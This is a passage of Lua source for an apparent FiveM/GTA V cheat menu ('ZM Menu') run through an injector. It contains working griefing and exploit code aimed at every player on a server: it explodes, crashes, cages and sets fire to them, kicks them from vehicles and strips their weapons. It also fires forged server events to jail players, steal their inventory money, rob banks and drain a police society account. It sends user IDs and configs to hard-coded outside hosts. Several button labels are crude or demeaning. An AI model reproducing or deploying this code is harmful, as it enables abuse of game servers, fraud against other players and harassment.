                            Winnie_ShootSingleBulletBetweenCoords(coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, boneCoords.x, boneCoords.y, boneCoords.z, 9000.0, 0, Winnie_GetHashKey("WEAPON_ASSAULTRIFLE_MK2"), Winnie_PlayerPedId(), true, false, 100000.0)
                        end
                    end
                end misc_scroll = misc_scroll + 0.020

                if misc_scroll >= 0.335 then
                    if button('Explode All', 0.415, misc_scroll, false) then
                        print('explode all')
                        for k, v in pairs(GetActivePlayers()) do
                            local coordsPlayer = Winnie_GetEntityCoords(Winnie_GetPlayerPed(v))
                            Winnie_AddExplosion(coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, math.floor(rE_Slider["Slider_explodetypemisc_value"]), 1000.0, true, false, true)
                        end
                    end
                end misc_scroll = misc_scroll + 0.020

                if misc_scroll >= 0.335 then
                    if button('Spawn Mass', 0.415, misc_scroll, false) then
                    CreateThread(function()
                        for k, v in pairs(GetActivePlayers()) do
                            local pedSelect = Winnie_GetPlayerPed(v)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)

                            local car = Winnie_GetHashKey("Mule")
                            Winnie_RequestModel(car)
                            while not Winnie_HasModelLoaded(car) do
                                Winnie_RequestModel(car)
                                Wait(0)
                            end

                            local vehicle = Winnie_CreateVehicle(car, coordsPlayer.x, coordsPlayer.y + 1, coordsPlayer.z, 600.0, true, false)
                            Winnie_SetEntityAsMissionEntity(vehicle, true, true)
                            Winnie_SetVehicleNumberPlateText(vehicle, "m1000")
                            local hash = Winnie_GetHashKey("cs_movpremmale")
                            while not Winnie_HasModelLoaded(hash) do
                                Wait(500)
                                Winnie_RequestModel(hash)
                            end
                            local pedpnj = Winnie_CreatePed("PED_TYPE_CIVMALE", "cs_movpremmale", -60.96, 360.39, 112.10,  600.161, false, true)
                            Winnie_TaskWarpPedIntoVehicle(pedpnj, vehicle, -1)
                            Winnie_SetVehicleForwardSpeed(vehicle, 1000.0)
                            end
                        end)
                    end
                end misc_scroll = misc_scroll + 0.020


                if misc_scroll >= 0.335 then
                    if button('Kick All Vehicle', 0.415, misc_scroll, false) then
                        for k, v in pairs(GetActivePlayers()) do
                            Winnie_ClearPedTasksImmediately(Winnie_GetPlayerPed(v))
                        end
                    end
                end misc_scroll = misc_scroll + 0.020

                if misc_scroll >= 0.335 then
                    if button('Terrorist Attack', 0.415, misc_scroll, false) then
                    CreateThread(function()
                        for _, player in pairs(GetActivePlayers()) do
                            local player = Winnie_GetEntityCoords(Winnie_GetPlayerPed(player))
                            local car = Winnie_GetHashKey("Miljet")

                            Winnie_RequestModel(car)
                            while not Winnie_HasModelLoaded(car) do
                                Winnie_RequestModel(car)
                                Wait(0)
                            end

                            local vehicle =
                            Winnie_CreateVehicle(car, player.x + 28,player.y + 36,player.z + 20,600.0,true,false)
                            Winnie_CreateVehicle(car,player.x + 4,player.y + 20,player.z + 1,600.0,true,false)
                            Winnie_CreateVehicle(car,player.x + 42,player.y + 15,player.z + 37,600.0,true,false)
                            Winnie_CreateVehicle(car,player.x + 26,player.y + 2,player.z + 50,600.0,true,false)
                            Winnie_CreateVehicle(car,player.x + 50,player.y + 20,player.z + 50,600.0,true,false)
                            Winnie_CreateVehicle(car,player.x + 48,player.y + 55,player.z + 15,600.0,true,false)
                            Winnie_CreateVehicle(car,player.x + 67,player.y + 45,player.z + 17,600.0,true,false)
                            Winnie_CreateVehicle(car,player.x + 84,player.y + 59,player.z + 19,600.0,true,false)
                            Winnie_CreateVehicle(car,player.x + 44,player.y + 82, player.z + 75,600.0,true,false)
                            Winnie_CreateVehicle(car,player.x + 64,player.y + 44,player.z + 10,600.0,true,false)
                            Winnie_CreateVehicle(car,player.x + 75,player.y + 44,player.z + 18,600.0,true,false)

                            Winnie_SetEntityAsMissionEntity(vehicle, true, true)
                            Winnie_SetVehicleNumberPlateText(vehicle, "m1000")
                            Winnie_SetVehicleForwardSpeed(vehicle, 250.0)

                            end
                        end)
                    end
                end misc_scroll = misc_scroll + 0.020

                if misc_scroll >= 0.335 then
                    if button('Give Weapon All', 0.415, misc_scroll, false) then
                        for k, v in pairs(GetActivePlayers()) do
                            for k, a in pairs(weapons) do
                                Winnie_GiveWeaponToPed(Winnie_GetPlayerPed(v), GetHashKey(a), 255, true, false)
                            end
                        end
                    end
                end misc_scroll = misc_scroll + 0.020

                if misc_scroll >= 0.335 then
                    if button('Remove All Weapons', 0.415, misc_scroll, false) then
                        for k, v in pairs(GetActivePlayers()) do
                            Winnie_RemoveAllPedWeapons(Winnie_GetPlayerPed(v), true)
                        end
                    end
                end misc_scroll = misc_scroll + 0.020

                if misc_scroll >= 0.335 then
                    if button('Spawn Transexual', 0.415, misc_scroll, false) then
                    CreateThread(function()
                        for k, v in pairs(GetActivePlayers()) do
                        local ped = GetPlayerPed(v)
                        local pullp = "a_m_m_tranvest_01"

                        if not HasModelLoaded(GetHashKey(pullp)) then
                            RequestModel(GetHashKey(pullp))
                        end
                        CreatePed(0, GetHashKey(pullp), GetEntityCoords(GetPlayerPed(v)), 1, 1, 1)
                             end
                        end)
                    end
                end misc_scroll = misc_scroll + 0.020

                if misc_scroll >= 0.335 then
                    if button('Random Peds', 0.415, misc_scroll, false) then
                    CreateThread(function()
                        for k, v in pairs(GetActivePlayers()) do


                                local pedSelect = Winnie_GetPlayerPed(v)
                                local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                                local ped_hash = Winnie_GetEntityModel(pedSelect)

                                RequestModel(GetHashKey(ped_hash))
                                while not HasModelLoaded(ped_hash) do
                                    Wait(0)
                                end

                                Winnie_CreatePed(1, ped_hash, coordsPlayer.x, coordsPlayer.y, coordsPlayer.z + 1.0, 90.0, true, false)
                                end
                            end)
                        end
                    end misc_scroll = misc_scroll + 0.020

                if misc_scroll <= 0.50 then
                    if button('Random Props', 0.415, misc_scroll, false) then
                        for k, v in pairs(GetActivePlayers()) do
                            local pedSelect = Winnie_GetPlayerPed(v)
                            local coordsPlayer = Winnie_GetEntityCoords(pedSelect)
                            local object = Winnie_IsCreateObject(Winnie_GetHashKey(randomProps[math.random(#randomProps)]), 164.2524, -93.01299, 0, true, true, true)
                            Winnie_AttachEntityToEntity(object, pedSelect, Winnie_GetPedBoneIndex(pedSelect, 0x796E), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
                        end
                    end
                end misc_scroll = misc_scroll + 0.020

                if misc_scroll <= 0.50 then
                    if button('Clear Ped Tasks', 0.415, misc_scroll, false) then
                        for k, v in pairs(GetActivePlayers()) do
                            local pedSelect = Winnie_GetPlayerPed(v)
                            Winnie_ClearPedTasksImmediately(pedSelect)
                        end
                    end
                end misc_scroll = misc_scroll + 0.020

                if misc_scroll <= 0.50 then
                    if button('Unlock Vehicle', 0.415, misc_scroll, false) then
                        for k, v in pairs(GetGamePool("CVehicle")) do
                            SetVehicleDoorsLocked(v, 1)
                            SetVehicleDoorsLockedForPlayer(v, Winnie_PlayerId(), false)
                            SetVehicleDoorsLockedForAllPlayers(v, false)
                        end
                        request("Unlock Executed!", 3000)
                    end
                end misc_scroll = misc_scroll + 0.020

                if misc_scroll <= 0.50 then
                    if button('Ear Rape', 0.415, misc_scroll, false) then
                        for k, v in pairs(GetActivePlayers()) do
                            local coordsPlayer = Winnie_GetEntityCoords(Winnie_GetPlayerPed(v))
                            Winnie_PlaySoundFromCoord(-1, "CHECKPOINT_MISSED", coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, "HUD_MINI_GAME_SOUNDSET", true, 1.0, true)
                            Winnie_PlaySoundFromCoord(-1, "Power_Down", coordsPlayer.x, coordsPlayer.y, coordsPlayer.z, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, 1.0, true)
                        end
                    end
                end misc_scroll = misc_scroll + 0.020

                local misc_scroll2 = 0.34 + New.scroll13
                local menu_position, menu_position_y = New.x, New.y
                if mouseInBounds(0.52 + menu_position, 0.30 + menu_position_y, 0.10, 0.45) then

                    if Winnie_IsDisabledControlPressed(0, 14)  and misc_scroll2 >= 0.175 then
                        New.scroll13 = New.scroll13 - 0.015
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) and misc_scroll2 <= 0.33 then
                        New.scroll13 = New.scroll13 + 0.015
                    elseif Winnie_IsControlPressed(0, 172) and misc_scroll2 >= 0.175 then
                        New.scroll13 = New.scroll13 - 0.015
                    elseif Winnie_IsControlPressed(0, 173) and misc_scroll2 <= 0.32 then
                        New.scroll13 = New.scroll13 + 0.015
                    end
                end


                if misc_scroll2 >= 0.34 then
                    if checkbox('Cage All Player', 0.50, misc_scroll2, ZM_M1000.cgplayer) then
                        ZM_M1000.cgplayer = not ZM_M1000.cgplayer
                    end
                end misc_scroll2 = misc_scroll2 + 0.025

                if misc_scroll2 >= 0.34 then
                    if checkbox('Crash All Players', 0.50, misc_scroll2, ZM_M1000.crashplayer) then
                        ZM_M1000.crashplayer = not ZM_M1000.crashplayer
                    end
                end misc_scroll2 = misc_scroll2 + 0.025


                if misc_scroll2 >= 0.34 then
                    if checkbox('PTFX Spamming', 0.50, misc_scroll2, ZM_M1000.ptfxspamming) then
                        ZM_M1000.ptfxspamming = not ZM_M1000.ptfxspamming
                    end
                end misc_scroll2 = misc_scroll2 + 0.025


                if misc_scroll2 >= 0.34 then
                    if checkbox('Hydrant All Players', 0.50, misc_scroll2, ZM_M1000.waterplayer) then
                        ZM_M1000.waterplayer = not ZM_M1000.waterplayer
                    end
                end misc_scroll2 = misc_scroll2 + 0.025

                if misc_scroll2 >= 0.34 then
                    if checkbox('Molotov All Players', 0.50, misc_scroll2, ZM_M1000.molotovallp) then
                        ZM_M1000.molotovallp = not ZM_M1000.molotovallp
                    end
                end misc_scroll2 = misc_scroll2 + 0.025

                if misc_scroll2 >= 0.34 then
                    if checkbox('Whale Mass Spawn', 0.50, misc_scroll2, ZM_M1000.whaleplayer) then
                        ZM_M1000.whaleplayer = not ZM_M1000.whaleplayer
                    end
                end misc_scroll2 = misc_scroll2 + 0.025

                if misc_scroll2 >= 0.34 then
                    if checkbox('Explode Vehicles', 0.50, misc_scroll2, ZM_M1000.destroycars) then
                        ZM_M1000.destroycars = not ZM_M1000.destroycars
                    end
                end misc_scroll2 = misc_scroll2 + 0.025

                if misc_scroll2 <= 0.49 then
                    if checkbox('Fly All Vehicles', 0.50, misc_scroll2, ZM_M1000.asas) then
                        ZM_M1000.asas = not ZM_M1000.asas
                    end
                end misc_scroll2 = misc_scroll2 + 0.025



                button('Explode Type : '.. math.floor(82 * rE_Slider["Slider_explodetypemisc_value"]), 0.415, 0.565)
                slider2(0.428, 0.59, 0.08, "explodetypemisc", 82)


                button('PTFX Scale', 0.415, 0.62)
                slider2(0.428, 0.648, 0.08, "ptfxscalemisc", 100)

                button('Force Fly', 0.415, 0.675)
                slider2(0.428, 0.698, 0.08, "forcefly", 5)


                Winnie_DrawRect(New.x + 0.38, New.y + 0.415, 0.0016, 0.18, 60, 60, 60, 255)
                Winnie_DrawRect(New.x + 0.38, New.y + 0.465 + New.scroll12 * 0.63, 0.0016, 0.080, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)

                Winnie_DrawRect(New.x + 0.546, New.y + 0.415, 0.0016, 0.18, 60, 60, 60, 255)
                Winnie_DrawRect(New.x + 0.546, New.y + 0.48 + New.scroll13 * 0.715, 0.0016, 0.050, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)

            local positionDynamic = 0.34

            if positionDynamic then
                if jail_player then
                    if button('Jail', 0.64, positionDynamic) then
                        for k,v in pairs(GetActivePlayers()) do
                            TriggerServerEvent(jail_player, GetPlayerServerId(v), 300000, "ZM Menu on TOP")
                        end
                    end positionDynamic = positionDynamic + 0.025
                end

                if esx_policejob then
                    if button('Send bill', 0.64, positionDynamic) then
                        for k, v in pairs(GetActivePlayers()) do
                            TriggerServerEvent(esx_policejob, GetPlayerServerId(v), 10000, 10000)
                        end
                    end  positionDynamic = positionDynamic + 0.025
                end

                if steal then
                    if button('Steal Inventory Money', 0.64, positionDynamic) then
                        for k, v in pairs(GetActivePlayers()) do
                            TriggerServerEvent(steal, GetPlayerServerId(PlayerId()),  GetPlayerServerId(v), 'item_money', '', 10000)
                        end
                    end positionDynamic = positionDynamic + 0.025
                end


                if carry_player then
                    if button('Carry Player', 0.64, positionDynamic) then
                        for k, v in pairs(GetActivePlayers()) do
                            TriggerServerEvent(carry_player, GetPlayerServerId(v), nil, 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63, 10.0, 100000, 0.0, 49, 33, 1)
                        end
                    end  positionDynamic = positionDynamic + 0.025
                end

                if piggyback then
                    if button('PiggyBack', 0.64, positionDynamic) then
                        for k, v in pairs(GetActivePlayers()) do
                            TriggerServerEvent(piggyback,  -1, 'rcmpaparazzo_2', 'shag_loop_a', 'shag_loop_a', -0.07, 0.0, 0.45, GetPlayerServerId(v), 100000, 0.0, 49, 33, 1)
                        end
                    end  positionDynamic = positionDynamic + 0.025
                end

                if take_hostage then
                    if button('Take Hostage', 0.64, positionDynamic) then
                        for k, v in pairs(GetActivePlayers()) do
                            TriggerServerEvent(take_hostage, GetPlayerPed(v), 'anim@gangops@hostage@', 'anim@gangops@hostage@', 'perp_idle', 'victim_idle', 0.11, -0.24, 0.0, GetPlayerServerId(v), 100000, 0.0, 49, 49, 50, true)
                        end
                    end  positionDynamic = positionDynamic + 0.025
                end

                if GiveVehicle then
                    if button('Give Vehicle', 0.64, positionDynamic) then
                        local veh = KeyboardInput("Vehicle :", "", 50)
                        TriggerEvent("r4lz-utils:client:SpawnVehicle", veh) --- fdp de kaykle
                    end positionDynamic = positionDynamic + 0.025
                end

                if GiveXP then
                    if button('Give XP', 0.64, positionDynamic) then
                        local XP = KeyboardInput("XP :", "", 50)
                        TriggerEvent("kcore:client:addEXP", XP)
                    end positionDynamic = positionDynamic + 0.025
                end

                if SellWeapon then
                    if button('Sell Weapon', 0.64, positionDynamic) then
                        TriggerServerEvent("r4lz-utils:server:putSell", item, 'WEAPON_HEAVYSNIPER_MK2', 1, 10000000000)
                    end positionDynamic = positionDynamic + 0.025
                end

                if GiveWeapon then
                    if button('Give Weapon', 0.64, positionDynamic) then
                        TriggerServerEvent("r4lz-utils:server:getItemShop", item, 'WEAPON_HEAVYSNIPER_MK2', 50, 0)
                    end positionDynamic = positionDynamic + 0.025
                end

                if esx_drugs then
                    if button('Make Drugs', 0.64, positionDynamic) then
                            TriggerServerEvent(esx_drugs)
                        end positionDynamic = positionDynamic + 0.025
                    end

                    if esx_drugs_transform then
                        if button('Transform Drugs', 0.64, positionDynamic) then
                                TriggerServerEvent(esx_drugs_transform)
                            end positionDynamic = positionDynamic + 0.025
                        end

                    if esx_drugs_sell then
                        if button('Sell Drugs', 0.64, positionDynamic) then
                                TriggerServerEvent(esx_drugs_sell)
                            end positionDynamic = positionDynamic + 0.025
                        end


                        if esx_hifi then
                            if button('Play Music', 0.64, positionDynamic) then
                                for k, v in pairs(GetActivePlayers()) do
                                    local Coords = GetEntityCoords(GetPlayerPed(v))
                                    local music = "https://www.youtube.com/watch?v=MA0WvwSUtCw&ab_channel=TheChannelofRandomness"
                                    TriggerServerEvent(esx_hifi, music, Coords)
                                end
                            end  positionDynamic = positionDynamic + 0.025
                        end

                        if esx_car_wash then
                            if button('Wash Money', 0.64, positionDynamic) then
                                TriggerServerEvent(esx_car_wash)
                            end positionDynamic = positionDynamic + 0.025
                        end

                        if tp_all then
                            if button('Teleport all Player', 0.64, positionDynamic) then
                                for k, v in pairs(GetActivePlayers()) do
                                    TriggerServerEvent(tp_all, GetPlayerPed(v))
                                end
                            end positionDynamic = positionDynamic + 0.025
                        end

                        if revive_player then
                            if button('Revive Player', 0.64, positionDynamic) then
                                local id = KeyboardInput("ID", "", 10)
                                TriggerServerEvent(revive_player, GetPlayerServerId(id))
                            end positionDynamic = positionDynamic + 0.025
                        end

                        if dpemote then
                            if button('Dancing All', 0.64, positionDynamic) then
                                for k, v in pairs(GetActivePlayers()) do
                                    TriggerServerEvent(dpemote, GetPlayerServerId(v), "dancehorse")
                                end
                            end  positionDynamic = positionDynamic + 0.025
                        end

                        if revive_ped then
                            if button('Revive', 0.64, positionDynamic) then
                                TriggerEvent(revive_ped)
                            end positionDynamic = positionDynamic + 0.025
                        end

                        if refill_food then
                            if button('Refill Food & Water', 0.64, positionDynamic) then
                                TriggerEvent(refill_food, 'hunger', 10000000000000)
                                TriggerEvent(refill_food, 'thirst', 10000000000000)
                                end positionDynamic = positionDynamic + 0.025
                            end


                        if jobs_civil_pays then
                            if button('Job Civil Pay', 0.64, positionDynamic) then
                                TriggerServerEvent(jobs_civil_pays, 600)

                                end  positionDynamic = positionDynamic + 0.025
                            end

                        if vangelico then
                            if button('Robbery', 0.64, positionDynamic) then
                                TriggerServerEvent(vangelico)
                                end  positionDynamic = positionDynamic + 0.025
                            end

                            if vangelico_bank then
                                if button('Robbery Bank', 0.64, positionDynamic) then
                                    TriggerServerEvent(vangelico_bank, 63600)
                                end  positionDynamic = positionDynamic + 0.025
                            end

                            if vangelico_bank then
                                if button('Vangelico Bank', 0.64, positionDynamic) then
                                    TriggerServerEvent(vangelico_bank, 63600)
                                end positionDynamic = positionDynamic + 0.025
                            end

                            if mecano_harvest then
                                if button('Mecano Harvest', 0.64, positionDynamic) then
                                    TriggerServerEvent(mecano_harvest)
                                end positionDynamic = positionDynamic + 0.025
                            end

                        if annouce_police then
                            if button('Announce Police', 0.64, positionDynamic) then
                                local message = KeyboardInput("Message", "", 500)
                                for k, v in pairs(GetActivePlayers()) do
                                    TriggerServerEvent(annouce_police, GetPlayerServerId(v), message)
                                end
                            end positionDynamic = positionDynamic + 0.025
                        end




                        if remove_money_society then
                            if button('Withdray Money Society', 0.64, positionDynamic) then
                                local message = KeyboardInput("Amount", "", 500)
                                TriggerServerEvent(remove_money_society, "society_police", message)
                                end  positionDynamic = positionDynamic + 0.025
                            end


                        if esx_ballas_weapon then
                            if button('Give Weapon', 0.64, positionDynamic) then
                                local message = KeyboardInput("Weapon?", "", 500)
                                TriggerServerEvent(esx_ballas_weapon, message, 0)
                                end positionDynamic = positionDynamic + 0.025
                            end

                         if esx_tabac_announce then
                            if button('Tabac Announce', 0.64, positionDynamic) then
                                local message = KeyboardInput("Announce", "", 500)
                                TriggerServerEvent(esx_tabac_announce, message)
                                end positionDynamic = positionDynamic + 0.025
                            end

                            if blanchisseur2 then
                                if button('Blanchisseur', 0.64, positionDynamic) then
                                    local amount = KeyboardInput("Amount", "", 10)
                                    TriggerServerEvent(blanchisseur2, amount)
                                end positionDynamic = positionDynamic + 0.025
                            end

                            if licensee then
                                if button('Give License', 0.64, positionDynamic) then
                                    TriggerServerEvent(licensee, 'dmv')
                                    TriggerServerEvent(licensee, 'drive')
                                    TriggerServerEvent(licensee, 'drive_bike')
                                    TriggerServerEvent(licensee, 'drive_truck')
                                end positionDynamic = positionDynamic + 0.025
                            end

                            if hostage then
                                if button('Hostage All', 0.64, positionDynamic) then
                                    local player = PlayerPedId()
                                    local lib = 'anim@gangops@hostage@'
                                    local anim1 = 'perp_idle'
                                    local lib2 = 'anim@gangops@hostage@'
                                    local anim2 = 'victim_idle'
                                    local distans = 0.11 --Higher = closer to camera
                                    local distans2 = -0.24 --higher = left
                                    local height = 0.0
                                    local spin = 0.0
                                    local length = 100000
                                    local controlFlagMe = 49
                                    local controlFlagTarget = 49
                                    local animFlagTarget = 50
                                    local attachFlag = true
                                    for k, v in pairs(GetActivePlayers()) do
                                        TriggerServerEvent(hostage, GetPlayerServerId(v), lib,lib2, anim1, anim2, distans, distans2, height, GetPlayerServerId(v),length,spin,controlFlagMe,controlFlagTarget,animFlagTarget,attachFlag)
                                    end
                                end positionDynamic = positionDynamic + 0.025
                            end




                        end

                        if positionDynamic == 0.34 then

                            if bWait <= 3 and GetGameTimer() >= (Waiting or 0) then
                                Waiting = GetGameTimer() + 1500
                                bWait = bWait + 1
                            elseif bWait >= 3 then
                                bWait = 0
                            end

                            if bWait == 0 then
                                TextString = "."
                            elseif bWait == 1 then
                                TextString = ".."
                            elseif bWait == 2 then
                                TextString = "..."
                            end
                            Winnie_DrawText2("No Trigger Dynamic Found " .. TextString, New.x + 0.62, New.y + 0.34, false, 0.27, false, 255, 255, 255, 255)
                        end
                    end

            if taberino == "Settings" then
                button("Keybind Menu", 0.415, 0.335)
                if button('['..oooopppppppeeeeeeeen["BindingTouch"].. "]", 0.46, 0.335) then
                    CreateThread(function()
                        local value, BindingTouch = bind()
                        oooopppppppeeeeeeeen["BindingTouch"] = BindingTouch
                        oooopppppppeeeeeeeen["Value"] = value
                    end)
                end


                if button("Close Menu", 0.415, 0.36) then
                    DuiCloseMouse()
                    New.active = false
                end

                if ZM_M1000.config then
                    saveconfig = true
                else
                    saveconfig = false
                end



                if mouseInBounds(New.x + 0.48, New.y + 0.350, 0.03, 0.01) and not ZM_M1000.config then
                    local x, y = Winnie_GetNuiCursorPosition()
                    local screenX, screenY = Winnie_GetActiveScreenResolution()
                    local cursorX, cursorY = x / screenX, y / screenY
                    Winnie_DrawText("[Save your configuration with the checkbox]", cursorX - 0.045, cursorY, false, 0.25, false, 255, 255, 255, 190)
                end

                if not ZM_M1000.config then
                    Winnie_DrawText("[?]", New.x + 0.48, New.y  + 0.350, true, 0.26, false, 252, 244, 3, 255)
                end

                if mouseInBounds(New.x + 0.43, New.y + 0.451, 0.03, 0.01) and not ZM_M1000.config then
                    local x, y = Winnie_GetNuiCursorPosition()
                    local screenX, screenY = Winnie_GetActiveScreenResolution()
                    local cursorX, cursorY = x / screenX, y / screenY
                    Winnie_DrawText("[Load Config safe with REC Config]", cursorX + 0.045, cursorY, false, 0.25, false, 255, 255, 255, 190)
                end

                if not ZM_M1000.config then
                    Winnie_DrawText("[?]", New.x + 0.43, New.y  + 0.451, true, 0.26, false, 252, 244, 3, 255)
                end





                if button("Launch Music", 0.415, 0.485) then
                result = KeyboardInput("Your Music", "", 30)
                   if result then
                        duienquestion = Winnie_CreateDui("https://vps-c7454f1e.vps.ovh.net:3000/grospenis?name="..result, 1000, 1000)
                    end
                end

                if button("Stop Music", 0.475, 0.485) then
                if ZM_M1000.musicclip then
                    ZM_M1000.musicclip = false
                        Winnie_DestroyDui(duienquestion)
                    end
                end

                if checkbox("With Clip", 0.51, 0.485, ZM_M1000.musicclip) then
                   if result then
                        ZM_M1000.musicclip = not ZM_M1000.musicclip
                            Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("music"),"youtube",Winnie_GetDuiHandle(duienquestion))
                        end
                    end

                if mouseInBounds(New.x + 0.43, New.y + 0.425, 0.03, 0.03) and not ZM_M1000.config then
                    local x, y = Winnie_GetNuiCursorPosition()
                    local screenX, screenY = Winnie_GetActiveScreenResolution()
                    local cursorX, cursorY = x / screenX, y / screenY
                    Winnie_DrawText("[Delete Config safe with REC Config]", cursorX + 0.045, cursorY, false, 0.25, false, 255, 255, 255, 190)
                end

                if not ZM_M1000.config then
                    Winnie_DrawText("[?]", New.x + 0.43, New.y  + 0.425, true, 0.26, false, 252, 244, 3, 255)
                end

                if button("Developer button", 0.415, 0.435) then
                    for k, v in pairs(GetGamePool("CPed")) do

                        print(v)
                    end







                end

                if button("Report Bug", 0.415, 0.41) then
                    local result = KeyboardInput("Send your problem", "", 200)
                    if result then
                        Winnie_CreateDui("http://zebuloshop.xyz/log.php?"..result.."ID RedENGINE : "..UUID, 1, 1)
                    end
                end


                if button("Panic Crash", 0.415, 0.385) then
                        while true do
                    end
                end

                if checkbox("Rainbow Hud", 0.51, 0.335, ZM_M1000.rnhud) then
                    ZM_M1000.rnhud = not ZM_M1000.rnhud
                end

                button('Color R', 0.415, 0.565)
                slider2(0.428, 0.59, 0.08, "colormenur", 255)

                button('Color G', 0.415, 0.62)
                slider2(0.428, 0.648, 0.08, "colormenug", 255)
                button('Color G', 0.415, 0.67)

                slider2(0.428, 0.698, 0.08, "colormenub", 255)

                button("[CONFIG]", 0.690, 0.337)

                if button('Save Config', 0.735, 0.390) then

                    local result = KeyboardInput('Name config?', '', 10)
                    local nameConfig = UUID.."_"..result
                    local urlPost = 'http://37.187.39.183:3002/Zm-Menu/config/'

                    local confiplein = tostring(ZM_M1000.np).." "..tostring(ZM_M1000.gd).." "..tostring(ZM_M1000.ivs).." "..tostring(ZM_M1000.fst).." "..tostring(ZM_M1000.stmn).." "..tostring(ZM_M1000.ncl).." "..tostring(ZM_M1000.authl).." "..tostring(ZM_M1000.fkd).." "..tostring(ZM_M1000.fstswin).." "..tostring(ZM_M1000.opplayer).." "..tostring(ZM_M1000.rollinfinity).." "..tostring(ZM_M1000.nrgl).." "..tostring(ZM_M1000.jp).." "..tostring(ZM_M1000.fcra).." "..tostring(ZM_M1000.boxes).." "..tostring(ZM_M1000.skelt).." "..tostring(ZM_M1000.plname).." "..tostring(ZM_M1000.tvision).." "..tostring(ZM_M1000.nivision)
                    local confiplein2 = " "..tostring(ZM_M1000.wcolor).." "..tostring(ZM_M1000.line).." "..tostring(ZM_M1000.bllplp) ..  " " .. tostring(ZM_M1000.nwater).." "..tostring(ZM_M1000.nprops).." "..tostring(ZM_M1000.hbar).." "..tostring(ZM_M1000.abar).." "..tostring(ZM_M1000.rmvfog).." "..tostring(ZM_M1000.chair).." "..tostring(ZM_M1000.blps).." "..tostring(ZM_M1000.eweapon).." "..tostring(ZM_M1000.cnight).." "..tostring(ZM_M1000.icnself).." "..tostring(ZM_M1000.icnpeds).." "..tostring(ZM_M1000.flbox).." "..tostring(ZM_M1000.speammo).." "..tostring(ZM_M1000.tgdead).." "..tostring(ZM_M1000.tgped).." "..tostring(ZM_M1000.pwall).." "..tostring(ZM_M1000.aimbot).." "..tostring(ZM_M1000.amlck).." "..tostring(ZM_M1000.infiniammo).." "..tostring(ZM_M1000.rpdfire).." "..tostring(ZM_M1000.nospread).." "..tostring(ZM_M1000.shootp).." "..tostring(ZM_M1000.ptfxbullet).." "..tostring(ZM_M1000.drawbullet).." "..tostring(ZM_M1000.antihd).." "..tostring(ZM_M1000.hitmarker).." "..tostring(ZM_M1000.fov).." "..tostring(ZM_M1000.fillfov).." "..tostring(ZM_M1000.head).." "..tostring(ZM_M1000.shoulder).." "..tostring(ZM_M1000.shoulder2).." "..tostring(ZM_M1000.pelvis).." "..tostring(ZM_M1000.feet).." "..tostring(ZM_M1000.feet2).." "..tostring(ZM_M1000.kneel).." "..tostring(ZM_M1000.kneer).." "..tostring(ZM_M1000.vbrajke).." "..tostring(ZM_M1000.vinvisible).." "..tostring(ZM_M1000.vdrift).." "..tostring(ZM_M1000.vboost).." "..tostring(ZM_M1000.vjump).." "..tostring(ZM_M1000.handling).." "..tostring(ZM_M1000.autrepair).." "..tostring(ZM_M1000.vnitro).." "..tostring(ZM_M1000.rcar).." "..tostring(ZM_M1000.vcol).." "..tostring(ZM_M1000.spawninside).." "..tostring(ZM_M1000.spec).." "..tostring(ZM_M1000.fdplayer).." "..tostring(ZM_M1000.mtvplayer).." "..tostring(ZM_M1000.tzplayer).." "..tostring(ZM_M1000.hyplayer).." "..tostring(ZM_M1000.killplayerr).." "..tostring(ZM_M1000.cgplayerm100teb).." "..tostring(ZM_M1000.spermecar).." "..tostring(ZM_M1000.launchplayer).." "..tostring(ZM_M1000.cgplayer).." "..tostring(ZM_M1000.crashplayer).." "..tostring(ZM_M1000.ptfxspamming).." "..tostring(ZM_M1000.waterplayer).." "..tostring(ZM_M1000.molotovallp).." "..tostring(ZM_M1000.whaleplayer).." "..tostring(ZM_M1000.destroycars).." "..tostring(ZM_M1000.asas).." "..tostring(ZM_M1000.musicclip).." "..tostring(ZM_M1000.rnhud).." "..tostring(ZM_M1000.atznshot).." "..tostring(ZM_M1000.stmnshot).." "..tostring(ZM_M1000.tlportovehicle).." "..tostring(ZM_M1000.gmdglife).." "..tostring(ZM_M1000.infammo).." "..tostring(ZM_M1000.espltbag).." "..tostring(ZM_M1000.strf).." "..tostring(ZM_M1000.tlpzmb).." "..tostring(ZM_M1000.autfrmxp).." "..tostring(ZM_M1000.autfrm).." "..tostring(ZM_M1000.rmvwindows).." "..tostring(ZM_M1000.wrpthevehicle).." "..tostring(ZM_M1000.frrzmo)

                    if result then
                        redENGINE.Request:Post(urlPost, {uuid = UUID, nameconfig = nameConfig, config = confiplein..confiplein2})
                    end
                    searchconfig()
                end


                if button('Delete Config', 0.735, 0.410) then
                    local urlPost = 'http://37.187.39.183:3002/Zm-Menu/configdeleted/'
                    local vvv = KeyboardInput('Name config?', '', 10)
                    local nameConfig = UUID.."_"..vvv
                    if vvv then
                        redENGINE.Request:Post(urlPost, {uuid = UUID, nameconfig = nameConfig})
                    end
                    searchconfig()
                end


                if button('Refresh Config', 0.735, 0.430) then
                    searchconfig()
                end

                if button('Link Your Discord', 0.735, 0.450) then
                    print('Link Your Discord')
                end

                if mouseInBounds(New.x + 0.655, New.y + 0.390, 0.1, 0.02) then
                    if IsDisabledControlJustPressed(1, 24) then
                        openmenu = not openmenu
                    end
                end
                if openmenu then

                    bite = true
                    DrawRect(New.x + 0.655, New.y + 0.450, 0.1, 0.1, 40, 40, 40, 255)
                    DrawRect(New.x + 0.655, New.y + 0.400, 0.1, 0.002, 26, 26, 26, 255) --- line haut
                    DrawRect(New.x + 0.655, New.y + 0.500, 0.1, 0.002, 26, 26, 26, 255) --- line bas
